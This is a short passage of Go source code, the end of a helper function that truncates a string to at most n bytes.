	if len(s) <= n {
		return s
	}
	return s[:n]
}
